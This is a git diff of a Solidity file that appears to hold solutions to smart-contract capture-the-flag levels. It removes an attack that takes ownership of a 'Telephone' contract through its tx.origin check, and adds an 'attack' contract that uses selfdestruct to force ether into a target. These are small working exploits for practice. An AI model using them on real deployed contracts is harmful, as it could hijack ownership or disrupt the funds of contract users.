@@ -1,24 +1,21 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract Telephone {
+contract Force {/*
 
-  address public owner;
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
 
-  constructor() {
-    owner = msg.sender;
-  }
-
-  function changeOwner(address _owner) public {
-    if (tx.origin != msg.sender) {
-      owner = _owner;
-    }
-  }
-}
+*/}
 contract attack{
-  constructor(address add)public
+  constructor() public payable{
+
+  }
+  function att(address add)public payable
   {
-    Telephone tele = Telephone(add);
-    tele.changeOwner(msg.sender);
+     selfdestruct(payable(add));
   }
 }
